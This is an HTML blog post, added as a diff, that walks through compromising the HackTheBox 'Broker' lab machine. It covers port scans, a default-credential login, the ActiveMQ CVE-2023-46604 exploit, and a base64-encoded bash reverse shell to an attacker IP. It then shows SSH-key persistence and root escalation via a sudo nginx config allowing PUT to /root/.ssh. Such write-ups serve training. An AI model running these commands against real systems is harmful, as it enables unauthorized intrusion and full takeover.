@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HackTheBox - Machine Broker</title>
+    <link rel="stylesheet" type="text/css" href="/css/style.css">
+    <link rel="stylesheet" type="text/css" href="/css/blog.css">
+</head>
+<body>
+    <div class="container">
+        <div class="article-content">
+            <h2>HackTheBox - Machine Broker</h2>
+            <p>IP: 10.10.11.243
+<br>Machine Name: Broker
+<br>Difficulty: Easy</p>
+
+<br><br>
+<p>Starting to scan with Nmap:</p>
+<code>sudo nmap --min-rate 5000 -sS -n -vvv -Pn 10.10.11.243 -oN scan_ports_tcp</code>
+<br>
+<p>I perform a scan using reconnaissance scripts with Nmap:</p>
+<code>sudo nmap -sCV -p22,80 -vvv 10.10.11.243 -oN targeted</code>
+<br>
+<p>I saw something related to "ActiveMQ", I went on to search for "ActiveMQ default port" and found port "61616". I can also perform a scan of all ports (1-65535).</p>
+<code>sudo nmap --min-rate 5000 -sS -n -vvv -Pn -p- 10.10.11.243 -oN scan_all_ports_tcp</code>
+<br>
+<img src="scan_all_ports.png" alt="scan all ports">
+
+<p>Since I knew the port through which ActiveMQ runs, I decided to run a scan with Nmap to detect the version number, also launching basic Nmap recon scripts.</p>
+<code>sudo nmap -sVC -vvv -p61616 10.10.11.243</code>
+<br>
+<img src="detecting_version.png" alt="detecting version">
+<br>
+<p>Another alternative was to log in with the credentials "admin:admin" on the port 80 site and navigate to /admin. It was there that I detected the version.</p>
+<img src="detecting_version_alternative.png" alt="detecting version alternative">
+<br>
+<p>With this information, I conclude that the service is running "ActiveMQ 5.15.15". I searched for "ActiveMQ 5.15.15 exploit" and found that there is a vulnerability related to the CVE identifier "CVE-2023-46604".</p>
+<img src="detecting_vuln.png" alt="detecting vuln">
+<br>
+<p>I went to search on GitHub for an exploit for "ActiveMQ 5.15.15", as it is common to find exploits of this type on that platform.</p>
+<img src="search_exploit.png" alt="search exploit">
+<br>
+<p>Click on the first result, and clone the GitHub repository.</p><code>git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ</code>
+<p>Then I went into the folder:</p><code>cd CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ</code>
+<p>Since only one EXE file was provided, I will proceed to compile the Go file as follows:</p>
+<code>go build -ldflags '-s -w' .</code>
+<br><p>By using "-s", I tell the linker to omit the debugging symbol information from the binary. With "-w", I indicate that the linker should omit the debugging information from the program. This process results in a much lighter executable compared to simply running "go build .". I like to further reduce the size of the executable, so I will apply UPX to it:</p>
+<code>upx ActiveMQ-RCE</code>
+<br><p>It must then be set to listen on port 8001:</p><code>python3 -m http.server 8001</code>
+<p>Why should I listen on port 8001? Simply because it will read from the poc-linux.xml file and send us the reverse shell.</p>
+<img src="poc_linux.png" alt="poc linux">
+<br><p>We convert this to base64 to send the connection:</p>
+<code>echo -n "bash -c 'bash -i >& /dev/tcp/{Your_IP}/8443 0>&1'" | base64 -w 0</code>
+<br><p>Sure, in the image it is downloading an ELF file from the machine, but I found it easier to simply place the following value in "value":</p>
+<code>echo -n {Your_Output_Rev_Base64} | base64 -d | bash</code>
+<p>Then I start listening:</p><code>rlwrap nc -lnvp 8443</code>
+<br><p>Finally I launch:</p>
+<code>./ActiveMQ-RCE -i 10.10.11.243 -u http://{Your_IP}:8001/poc-linux.xml</code><br>
+<p>I should have received a connection on port 8443. Then, I performed the tty processing:</p><br>
+<code>script /dev/null -c bash<br>Ctrl + Z<br>stty raw -echo; fg<br>reset xterm<br>export TERM=xterm<br>export SHELL=bash<br>stty rows 30 columns 142</code>
+<p>When I use "stty rows 30 columns 142", I rely on the values of "stty size". You will have to adapt them to your screen size.
+<br><br>
+<p>When I ran "whoami", I noticed that it was the user "activemq". I went to "/home" and saw that I had a working directory. Since port 22 was open, I simply wanted to add access via SSH:
+</p>
+<code>
+cd /home/activemq<br>
+mkdir .ssh<br>
+echo -n "{Your_id_rsa.pub}" > authorized_keys<br>
+</code>
+<p>In the value of "Your_id_rsa.pub", I mean the content of the id_rsa.pub file. In case you don't have one associated with your current user, you can use ssh-keygen.
+<br><br>
+<p>Then, simply try to connect without providing a password; you should have access:</p>
+<code>
+ssh activemq@10.10.11.243
+</code>
+<p>Once I ran "sudo -l" and saw that I had permissions to run "nginx" as superuser without providing a password.</p>
+<img src="sudo_l.png" alt="sudo l"><br><br>
+<p>Since I have sudo permissions on Nginx, I will move on to create a custom configuration. I will create the file "pwned.conf" in the "/tmp" directory with the following content:</p>
+<code>
+user root;<br>worker_processes auto;<br>pid /run/nginx2.pid;<br>include /etc/nginx/modules-enabled/*.conf;<br>events {<br>      worker_connections 1024;<br>}<br>http {<br>     server {<br>         listen 7777;<br>         location / {<br>             root /;<br>             autoindex on;<br>             dav_methods PUT;<br>         }<br>     }<br>}<br>
+</code>
+
+<p>Then, I just have to add my custom configuration:</p><code>sudo /usr/sbin/nginx -c /tmp/pwned.conf</code><br>
+<p>Then, I access the website and I see the following: I have the root mount of the system. I will write my "id_rsa.pub" in "/root/.ssh/authorized_keys" to be able to access as user by SSH without providing password:</p>
+<img src="mount_root.png" alt="mount root">
+<br><p>Then I just add my id_rsa.pub to the authorized_keys using curl:</p>
+<code>curl -X PUT http://10.10.11.243:7777/root/.ssh/authorized_keys --upload-file ~/.ssh/id_rsa.pub</code>
+<p>I connect via ssh:</p>
+<code>ssh root@10.10.11.243</code>
+
+<br><p>Do you have any questions or experience any problems trying to solve the machine? Contact me on Discord or just talk to me for a chat! I'm available to chat :).</p><code>FisMatHack#3733</code>
+<p>Thanks for reading :)</p>
+<p>References:<br><br>https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ</p>
+
+        </div>
+    </div>
+    <div class="donate-banner">
+    <p>Do you like my content?</p>
+    <p class="donation-text">Could you help me by donating a book?</p>
+<script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="fismathack" data-color="#00ff80" data-emoji="📖"  data-font="Cookie" data-text="Buy me a book" data-outline-color="#000000" data-font-color="#000000" data-coffee-color="#FFDD00" ></script></div>
+
+</body>
+</html>
+
